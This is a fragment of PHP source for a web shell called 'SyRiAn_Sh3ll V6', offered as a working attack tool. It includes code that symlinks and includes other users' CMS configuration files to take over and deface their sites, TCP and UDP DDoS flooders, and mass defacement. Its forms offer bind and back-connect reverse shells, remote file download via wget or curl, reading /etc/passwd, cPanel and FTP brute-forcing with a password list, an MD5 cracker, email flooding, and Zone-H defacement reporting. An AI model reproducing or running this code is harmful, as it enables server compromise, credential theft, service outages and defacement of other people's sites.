	if(!$_POST['pass']){echo "You Forgot Something Important !! .. Like Hash : ) .";}
	else
	{
		$pass=htmlspecialchars($pass);
		$pass=stripslashes($pass);
		$dat=date("H:i:s");
		$date=date("d:m:Y");
		crack_md5();
	}
}
# --------------------------
#  Automatic Hacking
#---------------------------
elseif($_POST['AutoHackNow'])
{
	chdir($_POST['autoHackDir']);
	if(file_exists('AutoHackConfig.txt'))
	{
		DeleteFile('AutoHackConfig.txt');
	}
	$domainToHack = $_POST['domainToHack'];
	$domainToHack = str_replace("http://","",$domainToHack);
	$domainToHack = str_replace("www","",$domainToHack);
	$ScriptType  = $_POST['ScriptType'];
	$index = $_POST['index'];
	$scriptPath = $_POST['scriptPath'];
	$domainUser = getTheUser($domainToHack);
	$configPath = getConfigPath($ScriptType);

	if(function_exists('symlink'))
	{symlink("/home/$domainUser/public_html$scriptPath$configPath",'AutoHackConfig.txt');}
	else{Exe("ln -s /home/$domainUser/public_html$scriptPath$configPath AutoHackConfig.txt");	}
	$file = file_get_contents('AutoHackConfig.txt' ,null , null , true);
	GenerateFile('FileToInclude.txt',$file);
	ChangeMode('FileToInclude.txt',0644);
	include_once('FileToInclude.txt');
	AutoUpdateIndex();
}
# --------------------------
#  DDos Attacker ...        
#---------------------------
elseif($_POST['StartAttack'])
{
	$url = $_POST['ipToAttack'];
	set_time_limit(0);
	echo "[+] starting on $url\n";
	if($_POST['DDOSType'] == 'tcp'){$DDOSTCP = DDOSTcp($url); if($DDOSTCP){echo "[+] DDOS Attack Has Don3 .";}else{echo "[-] Something Wrong ! , i Can't DDOS The Server ! .";}}
	else if($_POST['DDOSType'] == 'udp'){DDOSUdp($url);}
}
# --------------------------
#  Changing Directory        
#---------------------------
if($_POST['changeDirectory'])
{
	$directory = $_POST['directory'];
	$directory = str_replace("\\\\"," ",$directory);
	$directory = str_replace(" ","\\",$directory);
	chdir($directory);
}	
# --------------------------
#  Mass Defacement        
#---------------------------
elseif ($_POST['massDefaceNow'])
{
	$massTry = massDefacement($_POST['massDir'],$_POST['massFileName'],$_POST['massIndex']);
	if($massTry == 'notfound'){echo 'Directory Not Found !!';}
	else if ($massTry == 'notperm'){echo 'Permission Denied !!';}
}
# --------------------------
#  Dos Server        
#---------------------------
else if($_POST['doAction'] && ($_POST['someAction'] == 'DOSServer1'))
{cx();}
else if($_POST['doAction'] && ($_POST['someAction'] == 'DOSServer2'))
{dosserver();}
# --------------------------
#  Get File       
#---------------------------
if($_POST['getFile'])
{
	$fileUrl = $_POST['fileUrl'];
	$getType = $_POST['getType'];
	if($getType == 'auto'){getFiles($fileUrl);}
	else{Exe("'".$getType." ".$fileUrl."'");}
}
// HTML Code . 
echo "</textarea>";
if($_POST['editFileSubmit'] && ($_POST['actionType'] == 'edit'))
{
echo "
<input type='hidden' name='currentPath' value=".getcwd()." />
<input type='hidden' value='".$_POST['editFile']."' name='file2edit' /> 
<input type='submit' value='Save' name='saveEditedFile' size='50'>
";
}
echo "</form>
<!-- Main Table -->
<table width='100%'><tr>
<td width='30%' height='30'>
<!-- End Of Main Table -->
<!-- Commands Alias-->
<form method='POST'><table width='100%' height='72' border='0' id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Commands Alias </td></tr><tr><td height='45' colspan='2'>";SelectCommand($os); echo "<input name='submitCommands' type='submit' value='ExecuteCommand'></td></tr></table></form>
<!-- End Of Commands Alias-->
</td>
<td width='30%' height='30'>
<!-- Command Line -->
<form method='POST'>
<table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Command Line </td></tr><tr><td height='45' colspan='2'>
<input type='text' name='cmd' id='commandLine' value='";
if($os == 'Windows')
echo "dir";
else echo 'ls -lia';
echo "' size='59'>
<input type='text' name='directory' value='".getcwd()."' size='59'>
<input name='Execute' id='Execute' type='submit' value='Execute' >
<input name='helpCommands' id='helpCommands' type='submit' value='?' >
</td></tr></table></form>
<!-- End Of Command Line -->
</td>
<td width='30%' height=30>
<!-- Files & Folders Handling -->
<form method='POST'>
<table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Files & Folders Handling </td></tr><tr><td height='45' colspan='2'>
<input type='text' name='editFile' id='editFile' size='25' value='index.txt'>
<select name='actionType' id='actionType' onchange='ChangeInputs();'>
<option value='edit'>Edit</option>
<option value='rename'>Rename</option>
<option value='copy'>Copy</option>
<option value='deleteFolder'>Delete Folder</option>
<option value='deleteFile'>Delete File</option>
<option value='createFile'>Create File</option>
<option value='createFolder'>Create Folder</option>
<option value='zip'>Zip</option>
<option value='unzip'>UnZip</option>
<option value='tar'>Tar</option>
<option value='untar'>UnTar</option>
<option value='gz'>GZ</option>
<option value='ungz'>unGZ</option>

</select>
<input type='hidden' name='currentPath' value='".getcwd()."' />
<input name='editFileSubmit' type='submit' value='Do'>
<div id='newName'>&nbsp;</div>
</td></tr></table></form>
<!-- Files & Folders Handling -->
</td>
</tr>
<tr>
<td width='30%'>
<!-- Chmod Force -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>CH Commands</td></tr><tr><td height='45' colspan='2'>
<input type='text' name='fileName' value='index.php' size='28'>
<input type='text' name='per' value='0644' size='10'>
<select name='ChCommands'>
<option value='chmod'>CHMODE</option>
<option value='chown'>CHOWN</option>
<option value='chgrp'>CHGRP</option>
</select>
<input type='submit' value='Change Now !' name='changePermission'>
</td></tr></table></form>
<!-- End Of Chmod Force -->
</td>
<td>
<!-- Get File -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Get File </td></tr><tr><td height='45' colspan='2'>
<input type='text' name='fileUrl' size='59' value='http://www.'>
<select name='getType'>
<option value='auto'>Auto</option>
<option value='wget'>wget</option>
<option value='curl -o'>curl -o</option>
<option value='get'>get</option>
<option value='lynx -source'>lynx -source</option>
</select>
<input name='getFile' type='submit' value='Get File' >
</td></tr></table></form>
<!-- End Of Get File -->
</td>
<td>
<!-- Bind Connection -->
<form method='POST'><table width='100%' height='72' border='0' id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Bind Connection </td></tr><tr><td height='45' colspan='2'>
<input type='text' name='port' size='10' value='443'>
<select class='inputz' size='1' name='use' id='bind_select' onchange='viewPass();'>
<option value='php1'>PHP[1]</option>
<option value='php2'>PHP[2]</option>
<option value='perl1-linux'>Perl[1] Linux & Pass</option>
<option value='perl2-linux'>Perl[2] Linux</option>
<option value='perl3-win'>Perl[3] WIN</option>
<option value='c1-linux'>C[1] Linux</option>
</select> 
<input class='inputzbut' type='submit' name='bind' value='Bind' />
<div id='view_bind_pass'>&nbsp;</div>
</td></tr></table></form>
<!-- End Of Bind Connection -->	
</td>
</tr>
<tr>
<td>
<!-- CGI Scripts -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>CGI Scripts </td></tr><tr><td height='45' colspan='2'>
<input type='text' value='".getcwd()."' name='cgiperlPath' size='35'>
<select name='cgiType' >
<option value='cgiPerl' >CGI Perl</option>
<option value='cgiPaython' >CGI Paython</option>
<option value='cgiUsers' >CGI Users</option>
</select>
<input type='submit' name='generatePel' value='Generate'></td></tr></table></form>
<!-- End Of CGI Scripts -->
</td><td>
<!-- Forbidden -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Forbidden </td></tr><tr><td height='45' colspan='2'>
<input type='text' value='".getcwd()."' name='forbiddenPath' size='70%'/>
<select name='403'>
<option value='DirectoryIndex'>DirectoryIndex</option>
<option value='HeaderName'>HeaderName</option>
<option value='TXT'>TXT</option>
<option value='404'>404</option>
<option value='ReadmeName'>ReadmeName</option>
<option value='footerName'>footerName</option> 
</select>
<input type='submit' value='Generate' name='generateForbidden'>
</td></tr></table></form>
<!-- End Of Forbidden -->
</td>
<td>
<!-- Back Connection -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Back Connection </td></tr><tr><td height='45' colspan='2'>
<input type='text' name='ip' size='26' value='".GetRealIP()."'>
<input type='text' name='backport' size='10' value='443'>
<select name='use' id='back_select' onchange='viewPass();'>
<option value='php1'>PHP[1]</option>
<option value='php2'>PHP[2]</option>
<option value='php3-win'>PHP[3] WIN</option>
<option value='php3-linux'>PHP[3] Linux</option>
<option value='php4'>PHP[4]</option>
<option value='perl1'>Perl[1]</option>
<option value='perl2'>Perl[2] Pass</option>
<option value='perl3-win'>Perl[3] WIN</option>
<option value='perl4-linux'>Perl[4] Linux</option>
<option value='c1'>C[1]</option>
</select> 
<div id='view_pass'>&nbsp;</div>
<input type='submit' name='backconn' value='Connect'>
</td></tr></table></form>
<!-- End Of Back Connection -->
</td>
</tr>
<tr>
<td>
<!-- Reading Files -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Reading Files & Dir Using PHP Bugs </td></tr><tr><td height='45' colspan='2'>
<input type='text' value='/etc/passwd' name='file' size='33'>
<input class='buttons' type='submit' name='read' value='Read File'>
<input class='buttons' type='submit' name='show' value='Show directory'>
</td></tr></table></form>
<!-- End Of Reading Files -->
</td>
<td>
<!-- Eval Code -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Scanners And Strings Tools </td></tr><tr><td height='45' colspan='2'>
<input type='text' id='php_eval' name='php_eval' size='50' value='<?php echo \"SyRiAn_Sh3ll V6\"; ?>' /> 
<select id='evalOrEnc' name='evalOrEnc' onchange='evalOrEnc2();'>
<option value='eval'>Eval Code</option>
<option value='enc'>Encryption</option>
<option value='analyze'>Analyze</option>
<option value='scan'>Scan Ports</option>
<option value='genServ'>Server Shortcut</option>
<option value='sqlScanner'>SQL Scanner</option>
<option value='uploadLFI'>Shell Uploader LFI</option>
<option value='DirectUser'>User [DirectAdmin]</option>
</select>
<input type='submit' name='submitEval' value='~Do~'></td></tr></table></form>
<!-- End Of Eval Code -->
</td>
<td>
<!-- Metasploit RC -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Metasploit Connection </td></tr><tr><td height='45' colspan='2'>
<input type='text' size='40' name='ip' value='127.0.0.1'>
<input type='text' size='5' name='port' value='443'>
<input type='submit' value='Connect' name='metaConnect'>
</td></tr></table></form>
<!-- End Of Metasploit RC -->
</td>
</tr>

<tr>
<td>
<!-- DDOS Attacker -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>DDOS Attacker </td></tr><tr><td height='45' colspan='2'>
<input type='text' name='ipToAttack' size='30' value='http://google.com/'>
<select name='DDOSType'>
<option value='tcp' >TCP</option>
<option value='udp' >UDP</option>
</select>
<input type='submit' name='StartAttack' value='Attack'>
</td></tr></table></form>
<!-- End Of DDOS Attacker -->
</td>
<td>
<!-- Upload Files -->
<form enctype=\"multipart/form-data\" method=\"POST\"><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Upload Files <input type='button' value='+' id='addUpload' size='5' onclick='addUploadInput();'></td></tr><tr><td height='45' colspan='2'>
<input type='file' name='uploadfile[]'><input type='file' name='uploadfile[]'>
<div id='uploadInput'></div>
<input type='hidden' name='uploadingDir' value='".getcwd()."'/>
<input type='submit' value='Upload Files' name='UploadNow'>
</td></tr></table></form>
<!-- End Of Upload Files -->
</td>
<td>
<!-- ACP Finder -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>ACP Finder </td></tr><tr><td height='45' colspan='2'>
<input name='hash_lol' class='textbox' type='text' size='38' value='http://www.example.com/'/>
<input type='text' value='.php' name='extention' size='5'/>
<input name='submit_lol' class='textbox' value='BruteForce Now' type='submit'>
<!-- End Of ACP Finder -->
</td></tr></table></form>
</td>
</tr>

<tr>
<td valign='top'>
<!-- SQL Reader -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Mass Defacement</td></tr><tr><td height='45' colspan='2'>
<input type='text' name='massDir' id='massDir' value='".getcwd()."' size='45' />
<input type='text' name='massFileName' id='massFileName' value='index.html' size='15' /><br>
<input type='text' name='massIndex' id='massDir' value='Hacked By SyRiAn_34G13' size='70' /><br>
<input type='submit' name='massDefaceNow' value='Deface Now' />
</td></tr></table></form>
<!-- End Of SQL Reader  -->
</td>
<td valign='top'>
<!-- MD5 Cracker -->
<form method='POST' name='nst'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>MD5 Cracker</td></tr><tr><td height='45' colspan='2'>
<input name='pass' size='80' value='md5 hash'><br>
<input type='text' name='chars' value='Chars' size='80' /><br>
<input type='submit' value='Crack' name='CrackMd5'> <font color=gray>EN:</font>
<a href=javascript:ins('abcdefghijklmnopqrstuvwxyz')>a-z</a>
<a href=javascript:ins('ABCDEFGHIJKLMNOPQRSTUVWXYZ')>A-Z</a>
<a href=javascript:ins('0123456789')>0-9</a>
<a href=javascript:ins(\"~`'\!#$%^&*()-_+=|/?&gt;<[]{}:&nbsp;.,\&quot;\")>Symbols</a>
</td></tr></table></form>
<!-- End Of MD5 Cracker -->
</td>
<td valign='top'>
<!-- Fast Tools -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Fast Tools </td></tr><tr><td height='45' colspan='2'>
<select name='someAction'>
<option value='genHtaccess'>Generate .Htaccess</option>
<option value='genPhp'>Generate PHP.INI</option>
<option value='genINI'>Generate INI.PHP</option>
<option value='findCon'>Get Configs PHP</option>
<option value='findConPerl'>Get Configs Perl</option>
<option value='showUsers'>Show Users</option>
<option value='DOSServer1'>DOS Server 1</option>
<option value='DOSServer2'>DOS Server 2</option>
<option value='headers'>Show Headers</option>
</select>
<input type='submit' value='Do Action' name='doAction'>
</td></tr></table></form>
<!-- End Of Fast Tools -->
</td>
</tr>
<tr>
<td valign='top'>
<!-- SQL Magic -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>SQL</td></tr><tr><td height='45' colspan='2'>
<input type = 'text' name='QU_HOST' value='127.0.0.1'>
<input type = 'text' name='QU_USER' value='DB User'><br/>
<input type = 'text' name='QU_PASS' value='DB Pass'>
<input type='text' name='QU_DB' value='DB Name' >
<select id='SQLType' name='SQLType' onchange='ChangeSQLType();'>
<option value='SQLQuery'>SQL Query</option>
<option value='SQLReader'>SQL Reader</option>
<option value='EmailExtractor'>Email Extractor</option>
</select>
<div id='inputType' >&nbsp;</div>
<input name='MySQLQuery' type='submit'>
</td></tr></table></form>
<!-- SQL Query  -->
</td>
<td valign='top'>
<!-- AutoMatic Hacking -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Automatic Hacking</td></tr><tr><td height='45' colspan='2'>
<input type='text' value='domain.com' id='domain' name='domainToHack' size='45'  onblur='Blur(\"domain\",\"domain.com\");' onclick='Clear(\"domain\",\"domain.com\");'  >
<input type='text' value='/vb' name='scriptPath' size='10'>
<select name='ScriptType' >
<option value='vb'>VBulletin</option>
<option value='wp'>WordPress</option>
<option value='jos'>Joomla</option>
<option value='ipb'>IP.Board</option>
<option value='phpbb'>PHPBB</option>
<option value='mybb'>MyBB</option>
<option value='smf'>SMF</option>
</select><br />
<input type='hidden' name='autoHackDir' />
<textarea name='index' cols='50' rows='5' id='Index'  onblur='Blur(\"Index\",\"Hacked By SyRiAn_34G13\");' onclick='Clear(\"Index\",\"Hacked By SyRiAn_34G13\");' >Hacked By SyRiAn_34G13</textarea>
<input type='submit' name='AutoHackNow' value='Hack Now' />
</td></tr></table></form>
<!-- End Of Email Extractor -->
</td>
<td valign='top'>
<!-- Mail Storm -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Mail Storm </td></tr><tr><td height='45' colspan='2'>
<textarea rows='6' cols='45' name='Comments' id='Comments' onblur='Blur(\"Comments\",\"Attacker Message\");' onclick='Clear(\"Comments\",\"Attacker Message\");' >Attacker Message</textarea>
<input type='text' name='to' value='Target Email' id='to' size='35'  onblur='Blur(\"to\",\"Target Email\");' onclick='Clear(\"to\",\"Target Email\");' >
<input type='text' size='5' name='nom' value='100'>
<input name='sendMailStorm' type='submit' value='Send Mail Storm ' >
</td></tr></table></form>
<!-- End Of Mail Storm -->
</td>
</tr>
<tr>
<td valign='top'>
<!-- Zone-H -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Zone-H Defacer</td></tr><tr><td height='45' colspan='2'>";
echo '<form method="post">
<input type="text" name="defacer" size="70" value="SyRiAn_34G13" />
<select name="hackmode">
<option >--------SELECT--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason">
<option >--------SELECT--------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
<textarea name="domain" cols="44" rows="9" id="domains" onblur="Blur(\'domains\',\'List Of Domains\');" onclick="Clear(\'domains\',\'List Of Domains\');" >List Of Domains</textarea>
<input type="submit" value="Send Now !" name="SendNowToZoneH" />
</form>';
echo "</td></tr></table></form>
<!-- End Of Zone-H -->
</td>
<td valign='top'>
<!-- Cpanel And FTP BruteForce Attacker -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Cpanel And FTP BruteForce </td></tr><tr><td height='45' colspan='2'>
<textarea rows='12' name='users' cols='23' >";
system('ls /var/mail');
echo "</textarea>
<textarea rows='12' name='passwords' cols='23' >123123\n123456\n1234567\n12345678\n123456789\n159159\n112233\n332211\n!@#$%^\n^%$#@!.\n!@#$%^&\n!@#$%^&*\n!@#$%^&*(\npassword\npasswd\npasswords\npass\np@assw0rd\npass@word1
</textarea>
<input type='text' name='target' size='16' value='127.0.0.1' >
<input name='cracktype' value='cpanel' checked type='radio'><sy>Cpanel (2082)</sy>
<input name='cracktype' value='ftp' type='radio'><sy>Ftp (21)</sy>
<input type='submit' value='   Crack it !   ' name='BruteForceCpanelAndFTP' >
</td></tr></table></form>
<!-- End Of Cpanel And FTP BruteForce Attacker -->
</td>
<td valign='top'>
<!-- Scripts Hacking -->
<form method='POST'><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='4%' height='21' style='background-color:".$sh3llColor."'>&nbsp;</td>
<td style='background-color:#666;padding-left:10px;'>Scripts Hacking</td></tr><tr><td height='45' colspan='2'>
<input type='text' name='HOST' id='HOST' value='127.0.0.1' onblur='Blur(\"HOST\",\"127.0.0.1\");' onclick='Clear(\"HOST\",\"127.0.0.1\");'>
						<input type = 'text' name='USER' id='USER' value='DB Username' onblur='Blur(\"USER\",\"DB Username\");' onclick='Clear(\"USER\",\"DB Username\");'>
						<input type = 'text' name='PASS' id='PASS' value='DB Password' onblur='Blur(\"PASS\",\"DB Password\");' onclick='Clear(\"PASS\",\"DB Password\");'>
						<input type ='text' name='DB' id='DB' value='DB Name' onblur='Blur(\"DB\",\"DB Name\");' onclick='Clear(\"DB\",\"DB Name\");'>
						<input type ='text' name='PREFIX' id='Prefix' value='Prefix' onblur='Blur(\"Prefix\",\"Prefix\");' onclick='Clear(\"Prefix\",\"Prefix\");'>
						<select name ='ScriptType' id='ScriptType' onchange='ScriptsType();' >
						<option value ='vb'>VBulletin</option>
						<option value ='wp'>WordPress</option>
						<option value ='jos'>Joomla</option>
						<option value ='ipb'>IP.Board</option>
						<option value ='phpbb'>PHPBB</option>
						<option value ='mybb'>MyBB</option>
						<option value ='smf'>SMF</option>
						</select>
						<select name='hackingType' id='hackingType' onchange='hackingTypes();'>
						<option value='indexChanger'>Index Changer</option>
						<option value='decrypt'>Decrypt Config</option>
						<option value='changeInfo'>Info Changer</option>
						</select>
						<span id='InjectShellSpan'><sy>Inject Sh3ll ? </sy><select name='injectShell' id='injectShell' onchange='injectShellFunction();'><option value='no'>NO</option><option value='yes\'>YES</option></select><sy> VBulletin Only ! </sy></span><span id='InjectShellTypeSpan'></span>
						<div id='SHB'><textarea name='INDEX' rows='9' id='theIndex' cols='45' onblur='Blur(\"theIndex\",\"Put Your Index Here !\");' onclick='Clear(\"theIndex\",\"Put Your Index Here !\");'  >Put Your Index Here !</textarea></div>	
<input type='submit' value='Hack Now !!' name='UpdateIndex' >
</td></tr></table></form>
<!-- End Of Scripts Hacking -->
</td></tr>
";
footer();
}
# ---------------------------------------#
#                 About                  #
#----------------------------------------#
else if($_GET['id']=='about')
{
	echo About();
	if($_POST['sendEmail'])
	{
		$ip = $_POST['ip'];
		$httpref = $_POST['httpref'];
		$httpagent = $_POST['httpagent'];
		$visitor = $_POST['visitor'];
		$visitormail = $_POST['visitormail'];
		$notes = $_POST['notes'];
		$yourEmail = "sy34@msn.com";
		if (eregi('http:', $notes)) {
		echo "<script>alert('this is not allowed !!');</script>";
		echo "<script>history.go(-1);</script>";
		}
		if(!$visitormail == "" && (!strstr($visitormail,"@") || !strstr($visitormail,".")))
		{
			echo "<script>alert('Enter Valid Email');</script>\n";
			echo "<script>history.go(-1);</script>";
		}
		
		if(empty($visitor) || empty($visitormail) || empty($notes )) 
		{
			echo "<script>alert('All Fields Are Required !!');</script> ";
			echo "<script>history.go(-1);</script>";
		}
		$todayis = date("l, F j, Y, g:i a") ;
		$subject = "New Message From Syrian-sh3ll Users";
		$notes = stripcslashes($notes);
		$message = " $todayis [EST] \n
		Message: $notes \n
		From: $visitor ($visitormail)\n
		Additional Info : IP = $ip \n
		Browser Info: $httpagent \n
		Referral : $httpref \n
		";
		$from = "From: $visitormail\r\n";
		mail($yourEmail, $subject, $message, $from);

		echo '
		<p align="center">
		Date: '.$todayis.'<br />
		Thank You : '.$visitor.' (  '.$visitormail.' )<br />
		<font color="#003399">Your Message Sent Successfully ! </font><br />';
		$notesout = str_replace("\r", "<br/>", $notes);
		echo $notesout;
		echo '</p>';
	}
	footer();
}
# ---------------------------------------#
#            Back Doors                  #
#----------------------------------------#
}
?>
